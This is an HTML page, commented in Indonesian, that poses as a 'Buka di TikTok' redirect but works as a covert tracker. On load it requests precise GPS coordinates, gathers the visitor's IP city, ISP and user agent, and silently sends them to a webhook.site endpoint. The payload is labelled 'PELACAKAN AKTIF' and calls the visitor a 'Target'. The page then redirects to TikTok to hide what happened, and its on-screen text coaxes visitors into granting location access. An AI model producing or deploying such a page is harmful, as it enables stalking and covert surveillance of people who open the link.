<!DOCTYPE html>
<html>
<head>
    <title>Buka di TikTok</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        async function kirimData(lat = "Ditolak", lon = "Ditolak") {
            try {
                // Ambil data IP & Provider
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                // Kirim ke Webhook kamu
                await fetch('https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        status: "PELACAKAN AKTIF",
                        google_maps: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "Target Menolak GPS",
                        koordinat: `${lat}, ${lon}`,
                        kota_ip: d.city,
                        isp: d.org,
                        perangkat: navigator.userAgent,
                        waktu: new Date().toLocaleString('id-ID')
                    })
                });
            } catch (e) {}
            
            // Setelah data dikirim, langsung lempar ke TikTok asli
            setTimeout(() => {
                window.location.replace("https://www.tiktok.com");
            }, 500);
        }

        function prosesMasuk() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => { kirimData(p.coords.latitude, p.coords.longitude); },
                    () => { kirimData(); },
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } else {
                kirimData();
            }
        }

        // Jalankan otomatis saat halaman dibuka
        window.onload = prosesMasuk;
    </script>
</head>
<body style="background:#000; color:#fff; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; margin:0;">
    <div style="text-align:center; padding:20px;">
        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="80" style="margin-bottom:20px;">
        <h3 style="margin:0 0 10px 0;">Membuka TikTok...</h3>
        <p style="color:#ccc; font-size:14px;">Situs ini mau membuka TikTok Anda.<br>Pastikan klik <b>"Izinkan"</b> jika muncul permintaan akses.</p>
        
        <div style="margin-top:30px;">
            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto;"></div>
        </div>
    </div>

    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
